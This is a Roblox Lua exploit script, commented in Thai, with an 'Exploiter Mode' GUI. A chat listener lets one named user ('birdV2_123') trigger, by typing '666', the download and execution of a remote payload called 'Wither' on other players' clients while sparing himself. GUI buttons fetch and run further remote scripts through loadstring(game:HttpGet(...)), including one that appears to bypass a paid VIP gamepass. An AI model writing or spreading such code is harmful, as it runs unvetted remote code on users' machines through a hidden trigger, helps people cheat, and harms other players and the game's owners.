-- 🌑 Wither Activation Script v2 – ปกป้อง birdV2_123! 🌑
-- รันเฉพาะเมื่อ birdV2_123 พิมพ์ "666" และไม่ให้สคริปต์กระทบเขา!

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TARGET_USER = "birdV2_123"

-- ฟังก์ชันตรวจจับแชท
local function onPlayerChatted(player)
    if player.Name == TARGET_USER then
        player.Chatted:Connect(function(message)
            if message:lower() == "666" then
                print("🔥 666 ถูกเรียกโดย "..TARGET_USER.."! กำลังปลดปล่อย Wither... 🔥")
                
                -- ป้องกันไม่ให้สคริปต์รันในตัว birdV2_123
                if LocalPlayer.Name == TARGET_USER then
                    print("🛡️ ปกป้อง "..TARGET_USER.." – ไม่รันในตัวเขา!")
                    return
                end

                -- รัน Wither ด้วย pcall (ป้องกัน crash)
                local success, err = pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
                end)

                if not success then
                    warn("⚠️ Wither ล้มเหลว! Error: "..tostring(err))
                else
                    print("💀 Wither ถูกปลดปล่อยแล้ว! (ไม่กระทบ "..TARGET_USER..")")
                end
            end
        end)
    end
end

-- เช็คผู้เล่นที่มีอยู่แล้ว
for _, player in ipairs(Players:GetPlayers()) do
    onPlayerChatted(player)
end

-- รองรับผู้เล่นใหม่
Players.PlayerAdded:Connect(onPlayerChatted)

print("🕸️ สคริปต์พร้อม – ปกป้อง "..TARGET_USER.." อย่างสมบูรณ์ 🕸️")


-- 🧩 GUI ส่วนเสริม⚙️ - ปุ่มไฟเปลี่ยนรัน Loadstring + ทุกอย่างใหญ่โตเท่! 🚀💀
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "ส่วนเสริม⚙️"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- ⚙️ ปุ่มหลัก (ลากได้)
local button = Instance.new("TextButton")
button.Name = "SettingsButton"
button.Text = "⚙️"
button.Size = UDim2.new(0, 55, 0, 55)
button.Position = UDim2.new(0.05, 0, 0.4, 0)
button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
button.TextColor3 = Color3.fromRGB(255,255,255)
button.TextSize = 30
button.Font = Enum.Font.GothamBold
button.BackgroundTransparency = 0.1
button.AutoButtonColor = true
button.Parent = gui

-- 🧲 ระบบลาก (เสถียรสุด)
local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

button.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = button.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateInput(input)
    end
end)

-- 🌟 GUI หลัก - ใหญ่ 450x350
local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 450, 0, 350)
main.Position = UDim2.new(0.5, -225, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
main.BackgroundTransparency = 0.2
main.Visible = false
main.Parent = gui

local corner = Instance.new("UICorner", main)
corner.CornerRadius = UDim.new(0, 16)
local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(0, 255, 255)

-- 🏷️ ป้ายชื่อ
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 0, 50)
label.Text = "ส่วนเสริม⚙️ - Exploiter Mode 🔥"
label.Font = Enum.Font.GothamBold
label.TextSize = 26
label.TextColor3 = Color3.fromRGB(0, 255, 255)
label.BackgroundTransparency = 1
label.Parent = main

-- 🔥 Row 1: "อ้อโต้ทำตัวติดไฟ" + ปุ่ม "เริ่ม" (เปลี่ยนรัน Loadstring!)
local fireLabel = Instance.new("TextLabel")
fireLabel.Size = UDim2.new(0.6, -10, 0, 50)
fireLabel.Position = UDim2.new(0, 10, 0, 65)
fireLabel.Text = "🔥 อ้อโต้ทำตัวติดไฟ 🔥"
fireLabel.Font = Enum.Font.GothamBold
fireLabel.TextSize = 22
fireLabel.TextColor3 = Color3.fromRGB(255, 100, 0)
fireLabel.BackgroundTransparency = 1
fireLabel.TextXAlignment = Enum.TextXAlignment.Left
fireLabel.Parent = main

local startButton = Instance.new("TextButton")
startButton.Size = UDim2.new(0.35, -10, 0, 50)
startButton.Position = UDim2.new(0.62, 0, 0, 65)
startButton.Text = "เริ่ม 🔥"
startButton.Font = Enum.Font.GothamBold
startButton.TextSize = 20
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
startButton.AutoButtonColor = true
startButton.Parent = main

local startCorner = Instance.new("UICorner", startButton)
startCorner.CornerRadius = UDim.new(0, 10)

-- 🦆 Row 2: สแปมเป็ด VIP
local duckLabel = Instance.new("TextLabel")
duckLabel.Size = UDim2.new(0.6, -10, 0, 50)
duckLabel.Position = UDim2.new(0, 10, 0, 130)
duckLabel.Text = "🦆 สแปมเป็ด (ต้องมีเกมพาสVIP)"
duckLabel.Font = Enum.Font.GothamBold
duckLabel.TextSize = 22
duckLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
duckLabel.BackgroundTransparency = 1
duckLabel.TextXAlignment = Enum.TextXAlignment.Left
duckLabel.Parent = main

local duckButton = Instance.new("TextButton")
duckButton.Size = UDim2.new(0.35, -10, 0, 50)
duckButton.Position = UDim2.new(0.62, 0, 0, 130)
duckButton.Text = "รัน 🦆"
duckButton.Font = Enum.Font.GothamBold
duckButton.TextSize = 20
duckButton.TextColor3 = Color3.fromRGB(255, 255, 255)
duckButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
duckButton.AutoButtonColor = true
duckButton.Parent = main

local duckCorner = Instance.new("UICorner", duckButton)
duckCorner.CornerRadius = UDim.new(0, 10)

-- 🌈 Animation เปิด/ปิด
local TweenService = game:GetService("TweenService")
local open = false

button.MouseButton1Click:Connect(function()
    open = not open
    if open then
        main.Visible = true
        main.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 450, 0, 350)
        }):Play()
    else
        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0)
        }):Play()
        task.wait(0.4)
        main.Visible = false
    end
end)

-- ==============================================
-- 🔥 ปุ่ม "อ้อโต้ทำตัวติดไฟ" → รัน Loadstring จาก GitHub!
-- ==============================================
startButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUxIllIll0O00OO/RobloxscriptTOU/refs/heads/main/Aura%20fire"))()
    end)
end)

-- ==============================================
-- 🦆 สแปมเป็ด VIP - Loadstring เดิม
-- ==============================================
duckButton.MouseButton1Click:Connect(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUxIllIll0O00OO/RobloxscriptTOU/refs/heads/main/Game%20pass%20Duck"))()
    end)
end)
